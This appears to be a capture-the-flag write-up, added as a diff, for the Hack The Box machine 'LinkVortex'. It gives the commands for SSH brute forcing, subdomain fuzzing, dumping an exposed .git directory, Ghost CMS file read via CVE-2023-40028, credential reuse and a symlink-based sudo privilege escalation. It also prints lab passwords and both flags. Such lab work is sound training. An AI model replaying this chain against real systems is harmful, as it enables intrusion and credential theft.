@@ -1,0 +1,134 @@
+# Link Vortex Write-Up
+
+Target: 10.10.11.47
+
+Initial Reconnaissance
+	- Performed an Nmap scan to identify open ports and services:
+		nmap -sC -sV 10.10.11.47
+	- Results:
+		- 22: SSH
+		- 80: HTTP
+	- Determined the system is running Linux.
+
+Web Server Analysis
+	- Attempted to visit the web server at 10.10.11.47 but couldn’t access it directly.
+	- Added the domain to /etc/hosts:
+		10.10.11.47 linkvortex.htb
+	- Accessed http://linkvortex.htb successfully after updating the hosts file.
+	- Observations:
+		- The website is a blog running Ghost 5.58.
+		- Found an inactive signup page at http://linkvortex.htb/#/portal/.
+		- Identified the blog author as "admin", providing a potential username.
+
+SSH Login Attempt
+	- Attempted to brute-force SSH using Hydra with the username "admin":
+		sudo hydra -v -t 4 -l admin -P <password_file> 10.10.11.47 ssh
+	- Result: No successful login.
+
+Directory and Subdomain Enumeration
+	- Initially used Gobuster for directory enumeration on http://linkvortex.htb/ but encountered issues filtering out numerous 401 responses.
+	- Switched to FFUF for better control.
+	- Enumerated subdomains:
+		ffuf -u http://linkvortex.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.linkvortex.htb" -mc 200
+	- Discovered: dev.linkvortex.htb.
+	- Added to /etc/hosts:
+		10.10.11.47 dev.linkvortex.htb
+	- Accessed http://dev.linkvortex.htb and found a "Launching Soon" page.
+
+Enumerating the Subdomain
+	- Ran FFUF on the subdomain to find directories:
+		ffuf -u http://dev.linkvortex.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404
+	- Result:
+		server-status [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 69ms]
+	- Attempted to exploit a Next.js middleware vulnerability (CVE-2025-29927) but it didn’t work.
+
+Discovering the .git Directory
+	- Realized the initial wordlist lacked hidden directories like .git/.
+	- Ran FFUF with a more comprehensive wordlist (common.txt):
+		ffuf -u http://dev.linkvortex.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 404
+	- Results:
+		.git/HEAD [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 46ms]
+		.git/logs/ [Status: 200, Size: 868, Words: 59, Lines: 16, Duration: 87ms]
+		.git [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 85ms]
+		.git/config [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 89ms]
+		.git/index [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 47ms]
+	- Note: Using the right wordlist (e.g., common.txt) is crucial for finding hidden directories like .git/.
+
+Exploiting the Exposed .git Directory
+	- Used GitHack to download the exposed .git directory:
+		python3 githack.py http://dev.linkvortex.htb/.git/
+	- Found files:
+		- authentication.test.js
+		- Dockerfile.ghost
+
+Finding /robots.txt
+	- Discovered /robots.txt on the main domain (http://linkvortex.htb/robots.txt), which was missed earlier:
+		User-agent: *
+		Sitemap: http://linkvortex.htb/sitemap.xml
+		Disallow: /ghost/
+		Disallow: /p/
+		Disallow: /email/
+		Disallow: /r/
+	- Lesson: Always check /robots.txt manually or include it in your enumeration wordlist.
+
+Ghost CMS Login
+	- Attempted SQL injection on the login page (http://linkvortex.htb/ghost/#/signin) but it didn’t work.
+	- Found potential credentials in authentication.test.js:
+		- Email: test@example.com
+		- Password: OctopiFociPilfer45
+	- Modified the email to admin@linkvortex.htb and successfully logged in:
+		- Email: admin@linkvortex.htb
+		- Password: OctopiFociPilfer45
+
+Exploiting CVE-2023-40028 for RCE
+	- Used CVE-2023-40028 to gain an interactive shell through the Ghost CMS admin panel.
+	- Ran the exploit with sudo to resolve permission issues.
+	- When prompted for a file, entered /etc/passwd to confirm access:
+		FILE> /etc/passwd
+		root:x:0:0:root:/root:/bin/bash
+	- Confirmed a valid shell with root access.
+
+Accessing Sensitive Configuration
+	- Found the Ghost CMS configuration file:
+		FILE> /var/lib/ghost/config.production.json
+	- Extracted SMTP credentials:
+		"mail": {
+			"transport": "SMTP",
+			"options": {
+				"service": "Google",
+				"host": "linkvortex.htb",
+				"port": 587,
+				"auth": {
+					"user": "bob@linkvortex.htb",
+					"pass": "fibber-talented-worth"
+				}
+			}
+		}
+
+SSH Login as User "bob"
+	- Used the extracted credentials to SSH into the system:
+		- Username: bob@linkvortex.htb
+		- Password: fibber-talented-worth
+	- Located the user flag:
+		2b9e92f8364223961dc541580b842c15
+
+Privilege Escalation
+	- Checked sudo permissions:
+		sudo -l
+	- Discovered bob can run /usr/bin/bash /opt/ghost/clean_symlink.sh *.png with NOPASSWD.
+	- Analyzed the clean_symlink.sh script:
+		- Moves symlinks ending in .png to /var/quarantined/ unless they point to /etc or /root, in which case they are deleted.
+		- If CHECK_CONTENT=true, it displays the contents of the quarantined file.
+
+Exploiting the Symlink Script
+	- Created a nested symlink to bypass the critical path check:
+		ln -s /root/root.txt hyh.txt
+		ln -s /home/bob/hyh.txt hyh.png
+	- Ran the script with CHECK_CONTENT=true to display the contents of the quarantined file:
+		sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hyh.png
+	- Since the symlink indirectly pointed to /root/root.txt, the script moved it to quarantine and displayed its contents:
+		Content:
+		12d2f4ae060e2c73047ddee49cb60687
+
+Conclusion
+	This box provided valuable lessons in subdomain and directory enumeration, exploiting exposed .git directories, and leveraging misconfigured scripts for privilege escalation. While external resources were needed at times, understanding the process is key to building independence in future challenges.
